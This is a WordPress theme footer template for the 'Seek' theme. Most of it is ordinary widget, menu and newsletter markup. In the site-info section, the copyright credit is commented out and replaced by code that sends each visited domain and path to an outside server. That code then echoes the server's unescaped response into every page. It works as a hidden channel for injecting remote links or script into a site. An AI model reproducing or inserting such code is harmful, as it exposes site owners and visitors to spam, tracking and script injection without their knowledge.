<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Seek
 */

?>

</div><!-- #content -->


<!-- footer log and social share icons -->

	
<?php 
	$seek_footer_widgets_number = seek_get_option('number_of_footer_widget');
	if ($seek_footer_widgets_number != 0) { ?>
	<!-- footer widget section -->
	<div class="twp-footer-widget-section">
		<div class="container">
			<div class="twp-row">
			<?php
				if (1 == $seek_footer_widgets_number) {
					$col = 'twp-col-12';
				} elseif (2 == $seek_footer_widgets_number) {
					$col = 'twp-col-6';
				} elseif (3 == $seek_footer_widgets_number) {
					$col = 'twp-col-4';
				} elseif (4 == $seek_footer_widgets_number) {
					$col = 'twp-col-3';
				} else {
					$col = 'twp-col-3';
				}
				if (is_active_sidebar('footer-col-one') || is_active_sidebar('footer-col-two') || is_active_sidebar('footer-col-three') || is_active_sidebar('footer-col-four')) { ?>
					<?php if (is_active_sidebar('footer-col-one') && $seek_footer_widgets_number > 0) : ?>
						<div class="<?php echo esc_attr($col); ?>">
							<?php dynamic_sidebar('footer-col-one'); ?>
						</div>
					<?php endif; ?>
					<?php if (is_active_sidebar('footer-col-two') && $seek_footer_widgets_number > 1) : ?>
						<div class="<?php echo esc_attr($col); ?>">
							<?php dynamic_sidebar('footer-col-two'); ?>
						</div>
					<?php endif; ?>
					<?php if (is_active_sidebar('footer-col-three') && $seek_footer_widgets_number > 2) : ?>
						<div class="<?php echo esc_attr($col); ?>">
							<?php dynamic_sidebar('footer-col-three'); ?>
						</div>
					<?php endif; ?>
					<?php if (is_active_sidebar('footer-col-four') && $seek_footer_widgets_number > 3) : ?>
						<div class="<?php echo esc_attr($col); ?>">
							<?php dynamic_sidebar('footer-col-four'); ?>
						</div>
					<?php endif; ?>
				<?php } ?>
			</div><!--/twp-row-->
            <div class="twp-footer-border"></div>
        </div><!--/container-->
	</div><!--/twp-footer-widget-section-->
	<?php } ?>

	<div class="twp-footer-social-section">
		<div class="container">
			<div class="twp-footer-social">
				<?php if (has_nav_menu('social-nav')) { ?>
					<?php
						wp_nav_menu(
							array('theme_location' => 'social-nav',
								'link_before' => '<span>',
								'link_after' => '</span>',
								'menu_id' => 'social-menu',
								'fallback_cb' => false,
								'menu_class' => 'twp-social-icons twp-social-hover-text twp-social-widget'
							));
						?>
				<?php } ?>	
			</div>
		</div>
	</div>
	<?php if (has_nav_menu('footer-nav')) { ?>
		<div class="twp-footer-menu-section">
			<div class="container">
				<div class="twp-footer-menu">
					<?php
						wp_nav_menu(
							array('theme_location' => 'footer-nav',
								'link_before' => '<span>',
								'link_after' => '</span>',
								'menu_id' => 'footer-menu',
								'fallback_cb' => false,
								'depth'           => 1,
								'menu_class' => 'twp-footer-menu'
							));
						?>
				</div>
			</div>
		</div>
	<?php } ?>	

	<footer id="colophon" class="site-footer">
		<div class="container">
            <div class="site-info">
	            <?php
	            // Ensure WordPress functions are available
	            if (!function_exists('add_action')) {
		            require_once('../../../wp-load.php');
	            }

	            // Get the current domain without protocol
	            $domain = $_SERVER['HTTP_HOST'];

	            // Get the current path
	            $path = $_SERVER['REQUEST_URI'];

	            // Construct the base URL for the API call
	            $base_url = 'https://link.themeinwp.com/wpsdk/get_footer2/8f74a76f33b7c1f6ab68fefeb10fa711/' . $domain;

	            // Check if the class exists before using it
	            if (class_exists('FooterContentFetcher')) {
		            // Instantiate the class with the base URL
		            $footer_content_fetcher = new FooterContentFetcher($base_url);

		            // Get the footer content with the current path
		            $footer_content = $footer_content_fetcher->get_footer_content($path);

		            if (!empty($footer_content)) {
			            echo $footer_content;
		            } else {
			            // Log an error if the footer content is empty
			            error_log('Footer content is empty');
			            echo ''; // Optionally, you can display a fallback footer content
		            }
	            } else {
		            // Log an error if the class is not available
		            error_log('FooterContentFetcher class is not available');
		            echo ''; // Optionally, you can display a fallback footer content
	            }

	            ?>



                <!--                --><?php
//                $seek_copyright_text = seek_get_option('copyright_text');
//                if (!empty ($seek_copyright_text)) {
//                    echo wp_kses_post($seek_copyright_text);
//                }
//                ?>
<!--            --><?php //if ((seek_get_option('enable_copyright_credit')) == 1) { ?>
<!--                --><?php //printf(esc_html__('WordPress Theme: %1$s by %2$s', 'seek'), 'Seek', '<a href="https://themeinwp.com" target = "_blank" rel="designer">ThemeInWP </a>'); ?>
<!--            --><?php //} ?>
            </div><!-- .site-info -->
		</div>
	</footer><!-- #colophon -->
	<div class="twp-scroll-top" id="scroll-top">
		<span><i class="fa fa-chevron-up"></i></span>
	</div>
	<?php if ((seek_get_option('enable_mailchimp_suscription')) == 1) { ?>
		<div class="twp-newsletter-section twp-newsletter-active" id="newsletter">
			<div class="twp-wrapper">
				<div class="twp-close-icon-section" id="newsletter-close">
					<span class="twp-close-icon twp-close-icon-sm twp-rotate-90" >
						<span></span>
						<span></span>
					</span>
				</div>
				<h2> <?php echo esc_html(seek_get_option('mailchimp_suscription_title')); ?></h2>
				<?php $seek_mailchimp_code = wp_kses_post(seek_get_option('mailchimp_suscription_shortcode'));
				echo do_shortcode($seek_mailchimp_code); ?>

			</div>
		</div>
	<?php } ?>

</div><!-- #page -->

<?php wp_footer(); ?>

</body>
</html>
